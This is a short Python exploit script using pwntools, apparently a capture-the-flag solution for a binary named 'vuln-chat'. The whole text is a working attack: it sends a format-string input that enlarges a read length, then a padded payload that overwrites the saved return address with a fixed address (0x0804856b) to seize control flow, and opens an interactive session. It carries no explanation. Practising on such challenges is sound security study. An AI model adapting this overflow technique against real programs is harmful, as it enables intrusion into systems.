from pwn import *

target = process('./vuln-chat')

format_overwrite = "0" * 20
format_overwrite += "%60s"

target.sendline(format_overwrite)
# print(format_overwrite)

target.recvuntil("I know I can trust you?")

ret_overwrite = bytes([0] * 49)
ret_overwrite += p32(0x0804856b)
# import sys
# sys.stdout.buffer.write(ret_overwrite)
target.sendline(ret_overwrite)

target.interactive()